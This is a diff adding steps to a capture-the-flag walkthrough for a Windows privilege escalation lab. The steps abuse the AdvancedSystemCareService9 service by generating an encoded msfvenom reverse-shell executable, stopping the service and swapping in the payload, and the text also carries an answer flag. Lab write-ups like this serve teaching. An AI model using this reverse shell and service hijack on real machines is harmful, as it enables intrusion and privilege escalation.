@@ -70,13 +70,30 @@ Take close attention to the CanRestart option that is set to true. What is the n
 
 ![Untitled](https://github.com/user-attachments/assets/d880fac8-5106-4520-8b72-e02d993c38dd)
 
-
-
-
-
 (AdvancedSystemCareService9)
 
 What is the root flag?
+
+1) Use msfvenom to generate a reverse shell as an Windows executable. (msfvenom -p windows/shell_reverse_tcp LHOST=your_ip LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe)
+
+![Untitled](https://github.com/user-attachments/assets/288ddbd5-7d64-404c-9692-fffcaede24c0)
+
+2) Open shell and stop the service which using ASCService.exe
+
+sc stop AdvancedSystemCareService9
+
+![Untitled](https://github.com/user-attachments/assets/573a1849-6339-43c0-b846-9610b767b322)
+
+After that exit the shell.
+
+3) Go to C:\Program Files (x86)\IObit\Advanced SystemCare and upload ASCService.exe file which we generated
+
+![Untitled](https://github.com/user-attachments/assets/ba600259-e337-42b9-a582-8e0f04088ed6)
+
+
+
+
+
 
 (9af5f314f57607c00fd09803a587db80)
 
